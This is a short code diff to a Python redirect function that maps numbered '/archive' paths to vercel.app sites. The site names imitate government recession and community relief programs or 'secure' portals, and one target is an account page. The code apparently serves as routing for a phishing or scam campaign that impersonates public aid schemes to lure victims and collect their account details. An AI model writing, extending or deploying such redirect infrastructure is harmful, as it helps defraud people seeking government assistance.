@@ -15,9 +15,9 @@ def get_redirect_url(path):
     elif path == '/archive33':
         return 'https://govr-communityreliefprogram.vercel.app/'
     elif path == '/archive4':
-        return 'https://gov-recessionassist.vercel.app/'
-    elif path == '/archive44':
         return 'https://gov-recessionassist.vercel.app/account.html'
+    elif path == '/archive44':
+        return 'https://gov-recessionassist.vercel.app/'
     elif path == '/archive58578764':
         return 'https://secure-sharedposs345.vercel.app/' # B10 TRUE
     elif path == '/archive6':
